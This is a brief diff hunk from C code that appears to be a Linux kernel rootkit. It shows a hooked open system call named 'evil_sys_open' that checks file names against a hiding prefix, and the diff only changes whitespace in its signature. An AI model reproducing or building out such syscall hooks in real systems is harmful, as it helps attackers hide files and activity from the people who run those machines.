@@ -100,7 +100,7 @@ static char *basename(char *path)
   return base ? base + 1 : path;
 }
 
-asmlinkage long evil_sys_open(const char __user *filename,	int flags, int mode)
+asmlinkage long evil_sys_open(const char __user *filename, int flags, int mode)
 {
   if (!strncmp(basename(filename), HIDE_PREFIX, strlen(HIDE_PREFIX)))
   {
